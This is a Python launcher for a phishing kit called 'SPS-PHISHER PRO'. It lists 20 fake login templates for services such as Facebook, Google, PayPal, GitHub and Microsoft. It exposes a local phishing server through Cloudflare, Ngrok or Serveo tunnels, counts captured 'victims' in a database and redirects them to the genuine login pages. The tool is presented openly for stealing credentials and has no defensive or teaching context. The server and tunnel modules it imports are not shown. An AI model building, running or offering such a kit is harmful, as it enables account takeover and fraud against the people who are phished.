#!/usr/bin/env python3
import os,sys,json,time,threading,subprocess
from pathlib import Path
from core.server import PhishServer
from core.tunnel import TunnelManager
from core.database import Database

G='\033[1;32m';R='\033[1;31m';Y='\033[1;33m';C='\033[1;36m';P='\x1b[38;5;204m';X='\033[0m'
BASE_DIR=Path(__file__).parent
os.chdir(BASE_DIR)
for d in ['core','templates','logs']:Path(d).mkdir(exist_ok=True)

with open('config.json')as f:CONFIG=json.load(f)

TEMPLATES={
    '1':('facebook','Facebook','https://www.facebook.com/login.php'),
    '2':('instagram','Instagram','https://www.instagram.com/accounts/login/'),
    '3':('google','Google','https://accounts.google.com/signin/v2/identifier'),
    '4':('twitter','Twitter','https://x.com/i/flow/login'),
    '5':('netflix','Netflix','https://www.netflix.com/login'),
    '6':('tiktok','TikTok','https://www.tiktok.com/login'),
    '7':('snapchat','Snapchat','https://accounts.snapchat.com/accounts/v2/login'),
    '8':('github','GitHub','https://github.com/login'),
    '9':('microsoft','Microsoft','https://login.live.com'),
    '10':('paypal','PayPal','https://www.paypal.com/signin'),
    '11':('steam','Steam','https://store.steampowered.com/login'),
    '12':('spotify','Spotify','https://accounts.spotify.com/en/login'),
    '13':('linkedin','LinkedIn','https://www.linkedin.com/login'),
    '14':('yahoo','Yahoo','https://login.yahoo.com'),
    '15':('wordpress','WordPress','https://wordpress.com/log-in'),
    '16':('dropbox','Dropbox','https://www.dropbox.com/login'),
    '17':('reddit','Reddit','https://www.reddit.com/login'),
    '18':('pinterest','Pinterest','https://www.pinterest.com/login'),
    '19':('twitch','Twitch','https://www.twitch.tv/login'),
    '20':('discord','Discord','https://discord.com/login'),
}

def banner():
    print(f'''
{R}╔══════════════════════════════════════════════╗
║          ☠️ SPS-PHISHER PRO ☠️         ║
║        we are S-P-S Team we are legend

developer fred : @S_P_I_D_E_YYYY

depeloper ilyes 
╚══════════════════════════════════════════════╝{X}''')

def main():
    banner()
    print(f'{Y}[+] Available Templates:{X}\n')
    for k,v in TEMPLATES.items():print(f'  {G}[{k:2s}]{X} {v[1]}')
    choice=input(f'\n{C}[?] Choose [1-20]: {X}').strip()
    if choice not in TEMPLATES:print(f'{R}[-] Invalid{X}');return
    tid,tname,tredir=TEMPLATES[choice]
    try:port=int(input(f'{C}[?] Port [{CONFIG["default_port"]}]: {X}')or CONFIG['default_port'])
    except:port=CONFIG['default_port']
    print(f'\n{Y}[+] Tunnel:{X}')
    print(f'  {G}[1]{X} Cloudflare\n  {G}[2]{X} Ngrok\n  {G}[3]{X} Serveo\n  {G}[4]{X} Localhost')
    tchoice=input(f'{C}[?] Choose [1-4]: {X}').strip()
    db=Database()
    print(f'{G}[+] Database ready ({db.count()} victims){X}')
    tunnel=TunnelManager(port)
    tunnel.start(tchoice)
    time.sleep(2)
    tunnel.show()
    server=PhishServer(port,tid,tredir,db)
    print(f'{G}[+] Server: http://0.0.0.0:{port}{X}')
    print(f'{Y}[*] Waiting for victims...{X}\n')
    try:server.start()
    except KeyboardInterrupt:
        print(f'\n{Y}[!] Stopped. Total victims: {db.count()}{X}')
        server.stop()

if __name__=='__main__':main()